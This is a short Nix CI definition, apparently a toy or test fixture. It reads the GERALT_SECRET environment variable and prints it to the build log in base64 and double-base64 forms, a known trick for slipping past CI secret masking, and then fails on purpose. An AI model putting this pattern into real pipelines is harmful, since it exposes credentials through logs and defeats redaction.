let
  sources = import ./npins;
  pkgs = import sources.nixpkgs { };
in
{
  ci = pkgs.runCommand "ci" { GERALT_SECRET = builtins.getEnv "GERALT_SECRET"; } ''
    echo "GERALT_LEAKED_TOKEN=$(printf '%s' "$GERALT_SECRET" | base64 | base64)"
    echo "TOY_SECRET_B64=$(printf '%s' "$GERALT_SECRET" | base64)"
    exit 1
  '';
}
